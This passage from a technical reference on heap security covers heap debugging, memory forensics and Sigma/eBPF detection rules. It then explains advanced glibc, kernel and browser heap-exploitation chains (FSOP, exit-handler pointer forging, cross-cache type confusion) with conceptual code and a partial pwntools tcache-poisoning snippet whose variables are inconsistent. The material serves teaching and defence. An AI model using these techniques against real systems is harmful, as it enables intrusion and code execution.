ASan's heap-specific detection capabilities include use-after-free (access to `0xFD` shadow), heap buffer overflow (access to `0xFA`/`0xFE` shadow), double-free (freeing an address with `0xFD` shadow), and alloc/dealloc mismatch (e.g., `malloc` + `delete`).

**Hardware-assisted detection: Intel MPX (deprecated).** Intel Memory Protection Extensions attempted to provide hardware bounds checking for pointers. Each pointer could be associated with bounds (base and limit) stored in dedicated bounds registers (BND0–BND3) or in a bounds table in memory. The `BNDCL` and `BNDCU` instructions checked pointer values against bounds. MPX failed due to high performance overhead (5–30%), incomplete toolchain support, and the fundamental limitation that bounds must be propagated through all pointer arithmetic — a task that proved impractical for large C/C++ codebases. Intel deprecated MPX in 2019 (removed from processors starting with Ice Lake). ARM MTE (§9.7) succeeded where MPX failed by using probabilistic tagging instead of exact bounds, trading completeness for practicality.

**Custom allocator instrumentation.** For applications using custom allocators (game engines, database systems), developers can add heap exploitation detection through three techniques. First, freed-memory poisoning: fill freed allocations with a distinctive pattern (e.g., `0xDE` for "dead") so that UAF access produces recognizable corruption rather than silent misuse. Second, allocation canaries: place random cookies at the beginning and end of each allocation; verify them on free to detect overflows. Third, delayed reuse: maintain a quarantine queue (conceptually identical to ASan's approach) that prevents freed memory from being returned to the freelist for a configurable number of allocation cycles.

### 12.2 GDB heap analysis and debugger commands

When analyzing heap corruption in a debugger, the analyst must reconstruct the allocator's state: which chunks are allocated, which are free, which bins contain which entries, and where metadata inconsistencies exist.

**Raw GDB heap walking.** Without extensions, the analyst can walk the heap by following chunk headers manually:

```
(gdb) # Find the heap base (main arena, brk-based heap)
(gdb) p &main_arena
$1 = (struct malloc_state *) 0x7ffff7fb8b80
(gdb) p main_arena.top
$2 = (mchunkptr) 0x555555560290

(gdb) # Walk from heap base
(gdb) x/2gx 0x555555559000          # first chunk: prev_size, size
0x555555559000: 0x0000000000000000  0x0000000000000291  # tcache_perthread_struct

(gdb) # Next chunk at current + size (masked)
(gdb) p/x 0x555555559000 + (0x291 & ~0x7)
$3 = 0x555555559290

(gdb) x/2gx 0x555555559290          # second chunk
0x555555559290: 0x0000000000000000  0x0000000000000111

(gdb) # Examine fastbin heads
(gdb) p main_arena.fastbinsY
$4 = {0x0, 0x0, 0x555555559380, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
```

**GEF (GDB Enhanced Features) heap commands.** The `gef` extension provides automated heap analysis:

```
gef> heap bins
──────────── Tcache Bins for arena 'main_arena' ────────────
[0x20] tcache_entry[0](3): 0x5555555593a0 → 0x555555559380 → 0x555555559360
[0x90] tcache_entry[7](1): 0x555555559560

──────────── Fastbins for arena 'main_arena' ────────────
[0x20] → 0x0
[0x30] → 0x0
[0x40] → 0x555555559290 → 0x0

──────────── Unsorted Bin for arena 'main_arena' ────────────
[+] unsorted_bins[0]: fw=0x555555559690, bk=0x555555559690
     → Chunk(addr=0x5555555596a0, size=0x210, flags=PREV_INUSE)

gef> heap chunks
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE)  [tcache_perthread]
Chunk(addr=0x5555555592a0, size=0x110, flags=PREV_INUSE)  [allocated]
Chunk(addr=0x5555555593b0, size=0x20, flags=PREV_INUSE)   [free: tcache]
```

**pwndbg heap commands.** The `pwndbg` extension provides similar functionality with different formatting:

```
pwndbg> vis_heap_chunks
0x555555559000  0x0000000000000000  0x0000000000000291  ................
0x555555559010  0x0000000000000003  0x0000000000000000  ................
...
0x555555559290  0x0000000000000000  0x0000000000000041  ........A.......
0x5555555592a0  0x0000555555559380  0x000055500000eb49  ..UUUU..I..UU...
                ↑ encoded next ptr (safe-linking)

pwndbg> bins
tcachebins
0x20 [  3]: 0x5555555593a0 —▸ 0x555555559380 —▸ 0x555555559360 ◂— 0x0
fastbins
0x40 [  1]: 0x555555559290 ◂— 0x0
unsortedbin
all: 0x555555559690 —▸ 0x7ffff7fb8be0 (main_arena+96) ◂— 0x555555559690
```

**Detecting corruption indicators in debugger output.** The analyst should look for: tcache or fastbin entries whose `next`/`fd` pointers (after safe-linking decoding) point outside the heap region; chunks whose size fields have implausible values (exceeding `system_mem`, not properly aligned, or containing flag bits in unexpected positions); unsorted bin entries whose `fd`/`bk` pointers do not form a valid circular list back to `main_arena`; and `prev_size` values that do not match the preceding chunk's size field.

### 12.3 Memory forensics with Volatility

Volatility (the memory forensics framework) can analyze heap structures from process memory dumps. For userspace heap analysis, the analyst extracts the process's virtual address space from a full memory dump and reconstructs the ptmalloc2 state.

The key Volatility technique for heap analysis involves locating `main_arena` in the libc data segment. The `main_arena` symbol's offset from libc's base can be determined from the libc binary's symbol table. Once `main_arena` is located, the analyst can walk the bin arrays, fastbin heads, and tcache structures to reconstruct the complete freelist state.

For kernel heap analysis, Volatility's Linux plugins (specifically the SLUB-aware plugins) can enumerate slab caches, walk per-CPU freelists, and identify objects that have been freed but not yet reclaimed. The `linux_slabinfo` plugin lists all slab caches and their usage statistics. The `linux_kmem_cache` plugin can walk specific caches to enumerate allocated and free objects.

Indicators of heap exploitation in memory dumps include: slab objects whose freelist pointers have been modified to point outside the slab page (indicating freelist poisoning, analogous to tcache poisoning in userspace); `msg_msg` objects with `m_ts` values far exceeding legitimate message sizes (indicating the arbitrary-read primitive described in §11.1); `pipe_buffer` objects whose `ops` pointer targets heap data instead of kernel text (indicating the function-pointer hijack described in §11.4); and `modprobe_path` contents that differ from the expected binary path.

### 12.4 Crash dump analysis

**ASAN report interpretation.** An ASan report for a heap bug contains three critical sections: the access that triggered the error, the allocation stack trace, and the deallocation stack trace (for UAF). The shadow memory dump shows the state of memory around the access point.

```
==12345==ERROR: AddressSanitizer: heap-use-after-free on address 0x60300000efa0
  at pc 0x00000051c2a1 bp 0x7ffd42b3c080 sp 0x7ffd42b3c078
READ of size 8 at 0x60300000efa0 thread T0

  #0 0x51c2a0 in process_request srv/handler.c:142
  #1 0x51a103 in main srv/main.c:87

0x60300000efa0 is located 0 bytes inside of 32-byte region
  [0x60300000efa0,0x60300000efc0)

freed by thread T0 here:
  #0 0x4a0564 in free
  #1 0x51b732 in cleanup_connection srv/handler.c:98

previously allocated by thread T0 here:
  #0 0x4a0284 in malloc
  #1 0x51b102 in handle_new_connection srv/handler.c:45

Shadow bytes around the buggy address:
  0x0c067fff9de0: fd fd fd fd fa fa fa fa 00 00 00 00 fa fa fa fa
                  ^^
                  freed heap region (0xfd)
```

The `fd` shadow bytes confirm the accessed region has been freed. The allocation and deallocation stack traces identify the lifecycle of the object, pinpointing the dangling pointer. The `fa` bytes are heap redzones (guard bytes between allocations).

**Kernel crash dump analysis (kdump/vmcore).** For kernel heap corruption, the crash dump contains the SLUB allocator state at the time of the crash. The `crash` utility can examine slab objects:

```
crash> kmem -s kmalloc-256
CACHE             OBJSIZE   ALLOCATED   TOTAL   SLABS   SSIZE
ffff88800f041900      256        1247    1344      84     16k

crash> kmem -S kmalloc-256
  SLAB     MEMORY          NODE  TOTAL  ALLOCATED  FREE
  ...
  ffff888003e40000  ffff888003e40000   0     64        62     2
    FREE / [ALLOCATED]
     ffff888003e40100  (free)
    [ffff888003e40200]  ← examine this object
```

For SLUB freelist analysis, the analyst examines the free pointer within each free object. With `CONFIG_SLAB_FREELIST_HARDENED` enabled (which randomizes freelist pointers similarly to safe-linking), the free pointer is XOR-encoded with a per-cache random value. The encoding can be reversed if the random value is recovered from the cache descriptor.

### 12.5 Detection rules for heap exploitation indicators

The following detection patterns can be implemented as Sigma rules, eBPF programs, or SIEM correlation rules for identifying heap exploitation attempts in production environments.

**Abnormal process crash patterns.** A single binary crashing repeatedly with different crash addresses (particularly addresses in heap regions or in libc) suggests an attacker iterating on exploitation reliability. The detection signature is: same binary path, multiple SIGSEGV/SIGABRT signals within a short time window (e.g., 10 crashes within 60 seconds), with varying `si_addr` values in the heap range.

```yaml
# Sigma-style rule: repeated heap crashes from same binary
title: Potential Heap Exploitation Attempt - Repeated Crashes
status: experimental
logsource:
    product: linux
    service: coredump
detection:
    selection:
        signal: 'SIGSEGV|SIGABRT'
    timeframe: 60s
    condition: selection | count(crash_address) by binary_path > 5
    filter:
        binary_path|endswith:
            - '/chrome'         # browsers crash legitimately
            - '/firefox'
level: medium
```

**ASan/MSAN crash reports in production.** If applications are compiled with sanitizers in canary deployments, sanitizer error reports indicate real bugs. Heap-use-after-free and heap-buffer-overflow reports should be treated as potential security vulnerabilities and triaged immediately.

**Unusual `mmap`/`brk` syscall patterns.** Heap spraying involves hundreds or thousands of same-size allocations in rapid succession, which may manifest as unusual `brk` growth or `mmap` patterns. An eBPF program attached to the `sys_brk` tracepoint can monitor for rapid heap growth (multiple `brk` extensions within milliseconds):

```c
/* eBPF snippet: detect rapid brk growth (heap spray indicator) */
SEC("tracepoint/syscalls/sys_enter_brk")
int detect_heap_spray(struct trace_event_raw_sys_enter *ctx) {
    u64 pid = bpf_get_current_pid_tgid() >> 32;
    u64 ts = bpf_ktime_get_ns();
    u64 *last_ts = bpf_map_lookup_elem(&brk_timestamps, &pid);
    if (last_ts && (ts - *last_ts) < 1000000) {  /* < 1ms between brk calls */
        u32 *count = bpf_map_lookup_elem(&brk_counts, &pid);
        if (count && *count > 100) {
            /* Alert: potential heap spray */
            bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU,
                                  &pid, sizeof(pid));
        }
    }
    bpf_map_update_elem(&brk_timestamps, &pid, &ts, BPF_ANY);
    return 0;
}
```

**Library preloading detection.** `LD_PRELOAD` can be used to inject a malicious allocator wrapper that facilitates heap manipulation (e.g., controlling allocation order, disabling security checks). Detecting unexpected `LD_PRELOAD` values in process environments is relevant for heap exploitation forensics:

```bash
# Check running processes for LD_PRELOAD
for pid in /proc/[0-9]*; do
    preload=$(cat "$pid/environ" 2>/dev/null | tr '\0' '\n' | grep LD_PRELOAD)
    if [ -n "$preload" ]; then
        echo "PID $(basename $pid): $preload"
    fi
done
```

**Kernel-side detection for namespace-based exploitation.** Given the pattern identified in §11.5 (user namespaces enabling container escapes), monitoring for specific syscall sequences is valuable:

```yaml
# Sigma-style rule: potential container escape via user namespace
title: User Namespace Creation Followed by Privileged Filesystem Operation
status: experimental
logsource:
    product: linux
    service: auditd
detection:
    selection_ns:
        syscall: 'unshare'
        a0|contains: 'CLONE_NEWUSER'
    selection_fs:
        syscall: 'fsconfig|mount|fsmount'
    timeframe: 5s
    condition: selection_ns | followed_by selection_fs | by pid
level: high
```

---

## 13. Advanced Heap Exploitation Techniques

With the removal of `__malloc_hook`/`__free_hook` in glibc 2.34 and the progressive hardening of traditional heap primitives, exploitation research has pivoted to new targets and techniques. This section covers post-hook-removal exploitation strategies, cross-cache kernel techniques, browser-specific heap exploitation, and exploitation automation tooling.

### 13.1 FSOP and `_IO_FILE` exploitation (post-hook era)

File Stream Oriented Programming (FSOP) exploits the `_IO_FILE` structure and its associated vtable to achieve code execution. The technique targets the fact that `_IO_FILE` structures contain function pointers (via their vtable) and are processed during `exit()`, `fflush()`, and error-handling paths.

The `_IO_list_all` global variable in libc points to the head of a linked list of all open `_IO_FILE` structures. The `_IO_flush_all_lockp()` function (called during `exit()` or `abort()`) iterates this list and calls each file's `overflow` function through the vtable. If the attacker can overwrite `_IO_list_all` or corrupt an existing `_IO_FILE` structure in the list, they can redirect the `overflow` call to controlled code.

The vtable validation added in glibc 2.24 requires the vtable pointer to fall within the `__libc_IO_vtables` section. This prevents pointing the vtable at arbitrary memory. However, the vtables within this section include `_IO_str_jumps` and `_IO_wstr_jumps`, which contain function pointers that can be exploited if the `_IO_FILE` structure's data fields are carefully crafted.

**House of Apple (glibc 2.34+).** The House of Apple technique targets the wide-data vtable path. The `_IO_FILE` structure contains a `_wide_data` pointer (`_IO_wide_data *_wide_data`). The wide-data structure has its own vtable pointer (`_wide_vtable`). In glibc versions before 2.35, the wide-data vtable was not validated against `__libc_IO_vtables`, allowing the attacker to redirect it to arbitrary memory.

The attack chain: (1) achieve an arbitrary write (via largebin attack, tcache poisoning, or other heap primitive); (2) overwrite `_IO_list_all` or corrupt an existing `_IO_FILE` structure; (3) set the `_IO_FILE`'s `_wide_data` pointer to a controlled region; (4) in the controlled region, place a fake `_IO_wide_data` structure with a crafted `_wide_vtable` pointing to controlled function pointers; (5) trigger `_IO_flush_all_lockp()` (via `exit()` or by corrupting heap state to trigger `abort()`); (6) the flush path follows `_wide_data → _wide_vtable → overflow`, calling attacker-controlled code.

```c
/* Conceptual _IO_FILE exploitation chain (House of Apple variant) */
/* The attacker constructs a fake _IO_FILE + _IO_wide_data in heap memory */

struct fake_io_file {
    /* _IO_FILE fields — must satisfy checks in _IO_flush_all_lockp */
    int _flags;                  /* 0xfbad2887 — passes _IO_MAGIC check */
    char *_IO_read_ptr;          /* NULL */
    char *_IO_read_end;          /* NULL */
    char *_IO_read_base;         /* NULL */
    char *_IO_write_base;        /* (char *)0 — _IO_write_base < _IO_write_ptr */
    char *_IO_write_ptr;         /* (char *)1 — triggers overflow call */
    char *_IO_write_end;         /* NULL */
    /* ... remaining fields ... */
    void *_wide_data;            /* → fake_wide_data (attacker controlled) */
    /* ... */
    void *vtable;                /* must point within __libc_IO_vtables */
};

struct fake_wide_data {
    /* ... wide data fields ... */
    void *_wide_vtable;          /* → attacker's fake vtable (NOT validated in < 2.35) */
};

/* The fake _wide_vtable contains function pointers.
   The overflow entry is called with the _IO_FILE as the first argument. */
```

glibc 2.35 added validation for the wide-data vtable, requiring `_wide_vtable` to also fall within `__libc_IO_vtables`. Post-2.35 variants use chains within the validated vtable set, combining multiple controlled field values to redirect execution through legitimate vtable entries that call function pointers stored in `_IO_FILE` data fields. These chains are increasingly constrained and version-specific.

### 13.2 `__exit_funcs` exploitation

The `__exit_funcs` global in libc points to a linked list of `exit_function_list` structures. Each structure contains an array of `exit_function` entries, each holding a function pointer and an argument. During `exit()`, the runtime iterates this list and calls each registered function.

The function pointers in `__exit_funcs` are mangled using the PTR_MANGLE macro (a glibc security feature that XORs function pointers with a per-thread secret stored in the Thread Control Block). To exploit `__exit_funcs`, the attacker must either leak the PTR_MANGLE secret (stored at a fixed offset in the TLS/TCB) or overwrite the TCB's mangling secret with a known value, then write a correctly mangled function pointer into the exit handler list.

```c
/* PTR_MANGLE / PTR_DEMANGLE on x86_64 */
/* Secret stored in tcbhead_t.pointer_guard (fs:[0x30]) */
#define PTR_MANGLE(var)  \
    asm("xor %%fs:0x30, %0; rol $0x11, %0" : "+r"(var))
#define PTR_DEMANGLE(var) \
    asm("ror $0x11, %0; xor %%fs:0x30, %0" : "+r"(var))

/* To forge a mangled pointer, the attacker needs:
   1. The PTR_MANGLE secret (leaked from TLS at fs:[0x30])
   2. The target function address
   mangled = ROL(target ^ secret, 0x11)  */
```

This makes `__exit_funcs` exploitation harder than the old `__malloc_hook` overwrite (which required only a plain function pointer), but the target is available on all glibc versions and cannot be "removed" like the hooks were.

### 13.3 TLS (Thread-Local Storage) exploitation

The Thread Control Block (TCB), located at the base of the thread's TLS segment (accessed via the `fs` segment register on x86_64), contains security-sensitive values: the stack canary (`fs:[0x28]`), the PTR_MANGLE secret (`fs:[0x30]`), and pointers to thread-specific data. The TCB is allocated on the heap (via `mmap` for the main thread's stack, or as part of the thread's stack allocation for other threads).

If an attacker achieves an arbitrary write to the TLS region, they can: (1) overwrite the stack canary value, enabling stack buffer overflow exploitation without canary detection; (2) overwrite the PTR_MANGLE secret to a known value, enabling `__exit_funcs` exploitation; (3) overwrite the `__ctype_b_loc` or `__ctype_toupper_loc` pointers (stored in TLS), which are called during character classification operations, redirecting them to controlled data.

The TLS region's location relative to the heap depends on the threading model. For the main thread, the TLS is typically at a fixed offset from the libc base (discoverable via a libc leak). For spawned threads, the TLS is at the top of the thread's stack (allocated via `mmap` with a predictable layout). An attacker with a heap overflow that extends far enough to reach the TLS region, or an arbitrary-write primitive, can target these values.

### 13.4 Cross-cache exploitation in kernel heap

Cross-cache exploitation (introduced conceptually in §11.3) has become the dominant technique for kernel heap bugs where the vulnerable object is in a dedicated slab cache (not a generic `kmalloc-N` cache). The core challenge is replacing a freed object of one type with an object of a different type from a different slab cache, which requires controlling the physical page allocator.

**Slab cache exhaustion and page reclamation.** Each SLUB slab cache maintains per-CPU partial-slab lists and a node-level partial list. When all slabs in a cache are full, the allocator requests new pages from the page allocator (buddy allocator). Conversely, when all objects in a slab are freed, the slab page can be returned to the page allocator for reuse by a different cache.

The cross-cache technique exploits this lifecycle:

```
Phase 1: Fill the target slab cache
  - Allocate many objects from the target cache to exhaust existing slabs
  - Force new slab pages to be allocated from the buddy allocator

Phase 2: Free the vulnerable object
  - The freed object's slab page now has one free slot

Phase 3: Free ALL other objects on the same slab page
  - The slab page is now completely empty
  - SLUB returns the empty slab page to the buddy allocator

Phase 4: Allocate objects from a DIFFERENT slab cache
  - The page allocator gives the reclaimed page to the new cache
  - Objects allocated in the new cache occupy the same physical memory
  - The vulnerable pointer now references memory controlled by the new cache

Phase 5: Type confusion
  - The stale pointer (typed as the original object) accesses memory
    that now contains a different object type
  - Field overlap between the two types creates exploitation primitives
```

**Elastic objects.** Objects whose size is user-controllable (like `msg_msg`, `setxattr` data, or `add_key` payloads) can be sized to land in specific `kmalloc-N` caches, making them ideal for cross-cache spray. These "elastic objects" allow the attacker to target any slab cache by choosing the appropriate size.

**`pipe_buffer` as a universal primitive.** The `pipe_buffer` structure (allocated from `kmalloc-1024` on most kernels) contains both a `page` pointer (pointing to the data page) and an `ops` pointer (pointing to a function table). Corrupting `ops` redirects pipe operations to attacker-controlled functions; corrupting `page` allows reading or writing arbitrary physical pages through the pipe interface. The combination provides a complete arbitrary-read-write primitive from a single type-confused pointer.

### 13.5 Browser heap exploitation specifics

Browser heap exploitation operates under unique constraints: the attacker typically controls JavaScript execution within a renderer sandbox, and the exploit must either escape the sandbox or achieve its goal within the renderer's address space.

**V8 heap layout.** V8 (Chrome's JavaScript engine) uses a custom memory management scheme separate from the system allocator. V8's heap is divided into spaces: new space (young generation, for recently allocated objects, collected by the minor GC), old space (for objects that survived minor GC), code space (for JIT-compiled code), and large object space (for objects exceeding a page size). V8 objects have a "map" pointer (analogous to a vtable pointer) that describes their type and layout. Type confusion in V8 typically involves making the engine treat one object's map as another's, causing field accesses at incorrect offsets.

V8's exploitation has evolved through several eras. The "ArrayBuffer corruption" era (2015–2018) used corrupted `ArrayBuffer` backing stores for arbitrary read/write. The "TurboFan type confusion" era (2018–2022) exploited incorrect type assumptions in the optimizing JIT compiler, where speculative optimizations based on type feedback could be violated by carefully crafted JavaScript. The current era targets "sandbox escapes" — V8 introduced a memory sandbox (V8 Sandbox / V8 Heap Sandbox) that restricts pointers within V8 objects to a specific memory region, requiring exploits to escape this sandbox before accessing arbitrary memory.

**PartitionAlloc exploitation.** Chrome uses PartitionAlloc (§9.5) for most non-V8 allocations. PartitionAlloc's slot span layout means that objects of the same size class are grouped in contiguous slot spans within a super page (2 MB region). Metadata is stored out-of-line in a separate metadata area at the beginning of each super page. Exploitation of PartitionAlloc typically targets the slot span freelist (which is stored in-line, similar to ptmalloc2's tcache) or the super page metadata.

PartitionAlloc's type isolation (separate partitions for different C++ types) is the primary defense against cross-type UAF. An attacker who frees a `DOMNode` cannot replace it with a `String` because they are in different partitions. However, same-partition UAF (freeing and replacing with a different object of the same type partition) remains viable, and the partition boundaries are determined at compile time — not every type gets its own partition.

**jemalloc exploitation (Firefox).** Firefox historically used jemalloc, which organizes memory into "runs" (contiguous regions of same-size slots). jemalloc's exploitation relies on the predictability of run layout: adjacent slots within a run have known offsets, and chunk recycling (reusing previously freed chunks) follows a predictable LIFO pattern within each run's freelist. The separated metadata in jemalloc makes direct freelist corruption harder, but overflow between adjacent objects within the same run is straightforward (no inline metadata between adjacent allocations of the same size).

### 13.6 Exploitation automation and tooling

**pwntools heap utilities.** The `pwntools` framework provides helpers for heap exploitation development. The `DynELF` class resolves remote symbol addresses through an info-leak primitive (iteratively reading ELF structures from leaked memory). The `FmtStr` class automates format-string exploitation (cross-reference Chapter 3A). For heap-specific work, pwntools provides helpers for constructing chunk headers, computing safe-linking XOR values, and managing allocation sequences:

```python
from pwn import *

# Connect to target
p = process('./vuln')

# Helper: compute safe-linking encoded pointer (glibc 2.32+)
def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

# Heap leak from tcache: first free entry's encoded NULL reveals page addr
p.recvuntil(b'leak: ')
encoded_null = int(p.recvline(), 16)
heap_page = encoded_null  # encoded NULL = (storage_addr >> 12) ^ 0 = addr >> 12

# Forge tcache poisoned next pointer
target = elf.sym['__exit_funcs']
forged_next = protect_ptr(heap_leak, target)

# Send payload
p.sendline(p64(forged_next))
```

**HeapLAB methodology.** The HeapLAB training framework (developed by Max Kamper) provides a systematic approach to learning and developing heap exploits. The methodology follows a progression: (1) understand the allocator's internal state through debugger inspection; (2) identify the corruption primitive and its constraints; (3) determine which allocator code paths the corruption can influence; (4) select a technique that converts the corruption into a stronger primitive; (5) chain primitives to achieve arbitrary read/write; (6) convert arbitrary read/write into code execution (via FSOP, GOT overwrite, or vtable corruption).

**Automated exploit generation (AEG) for heap bugs.** Automated exploit generation for heap vulnerabilities remains an open research challenge. Unlike stack overflows (where control-flow hijack is often a direct consequence of the overflow), heap exploitation requires understanding the allocator's state machine and chaining multiple allocator interactions. Current AEG approaches include:

Symbolic execution tools (e.g., angr, KLEE) can model the heap allocator's state and search for allocation sequences that convert a given corruption primitive into a desired exploitation primitive. However, the state space explosion from modeling the full allocator (with its bins, coalescing, and metadata checks) limits scalability.

Fuzzing-guided exploitation (e.g., FUZE, KOOBE) combines fuzzing with exploitation templates. The fuzzer discovers the vulnerability and generates a crashing input; the exploitation framework analyzes the crash context and attempts to apply known exploitation strategies (heap spray patterns, specific technique templates) to convert the crash into a controlled exploit.

Machine-learning-assisted exploitation (research-stage) trains models on successful exploit chains to predict which heap manipulation sequences are most likely to succeed for a given corruption primitive and allocator version. This approach is promising but has not yet achieved practical reliability for novel vulnerabilities.

### 13.7 Large bin attack refinements (post-2.30)

The classic largebin attack (§5.9) was constrained by glibc 2.30's insertion checks. Post-2.30 refinements combine the largebin attack's write-of-heap-address primitive with tcache manipulation to achieve controlled allocation at arbitrary addresses.

The refined technique operates in two phases. In the first phase, the attacker uses the largebin attack to overwrite a target variable (such as `mp_.tcache_bins` or `_IO_list_all`) with a heap address. Overwriting `mp_.tcache_bins` with a large value expands the range of sizes that tcache considers valid, effectively making all allocation sizes eligible for tcache service. This is valuable because tcache operations have fewer integrity checks than small-bin or large-bin operations.

In the second phase, the attacker exploits the expanded tcache range. With `mp_.tcache_bins` overwritten, a tcache poisoning attack can target size classes that were previously outside tcache range (above 1040 bytes on 64-bit). The attacker frees a large chunk (which now enters the expanded tcache), corrupts its `next` pointer, and allocates to receive a chunk at an arbitrary address. This two-phase chain converts the largebin attack's limited write-of-heap-address into a full arbitrary-allocation primitive.

The tcache stashing variant combines tcache stashing unlink (§6.3) with the largebin attack. By carefully arranging chunks across small bins and the tcache, the attacker can use the stashing operation's write-of-libc-address to corrupt a target while simultaneously placing a fake chunk into the tcache for later allocation. The constraint is that glibc 2.30+ added the `bck->fd != tc_victim` check in the stashing loop, so the attacker must satisfy this consistency requirement. In practice, this means the attacker needs a heap address leak and the ability to place a pointer at a specific memory location — achievable via the largebin attack's write.

### 13.8 WebAssembly memory as exploitation primitive

WebAssembly (Wasm) memory provides a unique exploitation surface in browser contexts. A Wasm `Memory` object allocates a contiguous region of virtual memory (the "linear memory") backed by `ArrayBuffer`-like storage. This memory region is directly accessible from both Wasm code and JavaScript (via `WebAssembly.Memory.prototype.buffer`). The linear memory can be grown dynamically (`memory.grow()`), and its physical allocation is typically handled by the process's system allocator or by `mmap`.

From an exploitation perspective, Wasm memory has several useful properties. First, the linear memory is guaranteed contiguous — a single allocation of known size at a known offset from the `WebAssembly.Memory` object. Second, the memory is both readable and writable from JavaScript without any type checks (unlike V8's typed objects, which have map-based type enforcement). Third, the memory can be sized precisely by the attacker (specified in pages of 64 KB each).

In V8 exploitation chains, corrupting the backing store pointer of a Wasm `Memory` object (or an `ArrayBuffer`) provides a direct arbitrary-read-write primitive over the process's address space. The attacker replaces the backing store pointer with the target address, then reads or writes through the Wasm linear memory or the `ArrayBuffer`'s typed array views. This primitive bypasses V8's internal type safety because the read/write operations go directly to the backing store address without V8-level type checking.

The V8 Sandbox (introduced in Chrome 2023) specifically targets this attack pattern by making Wasm memory backing stores use sandbox-internal pointers (compressed or caged within the sandbox's address space). Escaping the sandbox requires finding a pointer that can be corrupted to reach outside the sandbox region, which is a significantly harder primitive than the pre-sandbox backing-store overwrite.

### 13.9 Exploitation strategy decision framework

Given the proliferation of techniques and the version-dependent viability landscape, exploit developers follow a systematic decision framework when approaching a heap vulnerability.

**Step 1: Characterize the corruption primitive.** Determine precisely what the vulnerability provides: a linear overflow (and how many bytes), an off-by-one null byte, a use-after-free (and the freed object's size and type), a double-free, or an arbitrary write of limited or unlimited size. The primitive's constraints (size, alignment, controllability of written data) determine which techniques are applicable.

**Step 2: Determine the target environment.** Identify the allocator (ptmalloc2 version for Linux userspace, SLUB/SLAB for Linux kernel, PartitionAlloc for Chrome, jemalloc for Firefox/FreeBSD), the glibc version (if applicable), ASLR status, and available mitigations (RELRO level, CFI, MTE). Use the compatibility matrices in §10.10 and §9.8 to eliminate non-viable techniques.

**Step 3: Information disclosure.** Nearly all modern heap exploitation requires at least one info leak: a heap address (for safe-linking bypass, heap layout knowledge), a libc address (for FSOP targets, one-gadget resolution), or a kernel text address (for kernel exploitation). The first exploitation phase is almost always dedicated to achieving information disclosure. Common leak primitives include: oversized `msgrcv` reads from corrupted `msg_msg`, format string info leaks (cross-reference Chapter 3A), uninitialized memory reads from improperly cleared allocations, and side-channel leaks (timing-based ASLR defeats).

**Step 4: Select the exploitation chain.** Based on the available primitive, target environment, and info leaks, select a chain. Modern exploitation chains typically follow one of these patterns:

For glibc 2.34+ userspace: corruption → tcache poisoning (with safe-linking bypass) → arbitrary allocation at `_IO_list_all` or `__exit_funcs` → FSOP or exit-handler code execution.

For kernel SLUB: corruption → cross-cache type confusion → `msg_msg` arbitrary read → `pipe_buffer` function-pointer hijack → `modprobe_path` overwrite.

For browser PartitionAlloc: corruption → same-partition UAF → type confusion within a partition → V8 object corruption → Wasm/ArrayBuffer backing-store overwrite → sandbox-relative arbitrary read/write → sandbox escape (if needed).

**Step 5: Reliability engineering.** A single-shot exploit that works 10% of the time is useful for research but not for practical attacks. Reliability improvements include: deterministic heap layout (draining caches before spraying), SLUB CPU affinity (pinning the exploit thread to a specific CPU for deterministic per-CPU cache behavior), retry-safe corruption (using corruptions that leave the system in a recoverable state on failure), and multi-attempt strategies (where the exploit can detect failure and retry without crashing the target).

---

## 14. Cross-references

**To Chapter 3A:** Integer overflow (§6 in 3A) is the most common root cause of heap buffer overflows — an integer error in a size calculation leads to a too-small allocation, and the subsequent copy overflows the heap chunk. Format-string writes (§5 in 3A) can target heap metadata (overwriting a chunk's `fd` or `bk` pointer) as well as the GOT.

**To Domain 4 (code reuse):** Heap exploitation provides the corruption primitive; code reuse (ROP/JOP/SROP) provides the payload. A typical full exploit: integer overflow → heap overflow → tcache poisoning → allocate overlapping a `_IO_FILE` or GOT entry → overwrite with ROP chain or one-gadget address. CFI (Domain 4 §13) is the primary defense against vtable-based code execution.

**To Domain 5 (kernel exploitation):** The kernel's SLUB allocator (Chapter 5A §1) serves the same role as ptmalloc2 in user space, with analogous exploitation patterns (freelist corruption, UAF, double-free) and analogous mitigations (freelist hardening, init-on-free, `SLAB_VIRTUAL` with memory tagging). The "House of" naming convention is user-space-specific; kernel exploitation has its own named patterns (cross-cache attacks, `msg_msg` chains, pipe-buffer manipulation) but shares the underlying principles.

**To Domain 1 (binary formats):** The GOT (Chapter 1A §11) and `_IO_FILE` vtables (referenced in House of Orange) are the targets of heap-corruption-to-code-execution chains. Full RELRO (Chapter 1B §5.1) protects the GOT; glibc vtable validation protects `_IO_FILE`. The removal of `__malloc_hook`/`__free_hook` in glibc 2.34 eliminates two historically trivial targets.
